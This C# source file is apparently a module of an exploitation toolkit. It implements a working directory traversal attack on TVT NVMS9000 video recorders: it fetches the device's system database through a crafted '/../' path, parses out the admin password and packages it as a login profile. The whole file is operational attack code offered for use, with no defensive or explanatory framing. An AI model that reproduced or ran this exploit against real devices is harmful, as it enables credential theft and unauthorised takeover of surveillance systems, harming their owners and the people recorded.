using System;
using System.Net;

using Kaye.Net;
using Kaye.Models;
using Kaye.Profiles;

namespace Kaye.Exploits
{
    public class NVMS9000PathTraversal : Exploit
    {
        private static String ExploitPath = "/../configInfo/Config/SystemDb.db3";

        public override string GetMessage() { return "TVT NVMS9000 directory traversal"; }

        public Model Model;
        public Profile[] Profiles;

        public static Boolean TryPerform(IPEndPoint Target, out NVMS9000PathTraversal Output)
        {
            Output = new NVMS9000PathTraversal();
            Output.Model = Model.NVMS9000;
            HTTPSender Http = new HTTPSender(Target);
            String Response = Http.DownloadString(ExploitPath);
            if (HTTPSender.CodeFromResponse(Response) != 200) return false;
            Int32 Pos = Response.IndexOf("}admin");
            if (Pos == -1) return false;
            Pos += 6;
            String Password = String.Empty;
            Char c;
            while ((c = Response[Pos]) != 4)
            {
                Password += c;
                Pos++;
            }
            Output.Profiles = new Profile[1];
            Output.Profiles[0] = new Profile("admin", Password);
            return true;
        }
    }
}